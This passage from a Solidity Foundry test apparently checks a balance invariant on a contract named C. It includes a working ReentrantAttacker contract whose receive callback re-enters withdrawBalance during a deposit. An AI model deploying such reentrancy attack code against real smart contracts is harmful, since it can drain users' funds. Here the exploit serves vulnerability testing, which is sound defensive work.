        vm.deal(depositor, depositAmount);

        // The attacker activates its receive callback to re-enter on the next deposit
        attacker.prepareAttack();

        // Depositor calls addToBalance, which triggers the attacker's receive -> withdrawBalance reentrancy
        vm.prank(depositor);
        c.addToBalance{value: depositAmount}();

        // Compute total user balance by querying all known users
        uint256 totalUserBal = c.getBalance(depositor) + c.getBalance(attackerAddr);

        // The invariant: contract Ether balance must equal sum of user balances after addToBalance
        assertTrue(address(c).balance == totalUserBal);
    }
}

contract ReentrantAttacker {
    C public target;
    bool public attackMode;
    constructor(C _target) {
        target = _target;
        attackMode = false;
    }
    function prepareAttack() external {
        attackMode = true;
    }
    receive() external payable {
        if (attackMode) {
            attackMode = false;
            // Re-enter the target contract via withdrawBalance
            target.withdrawBalance();
        }
    }
}

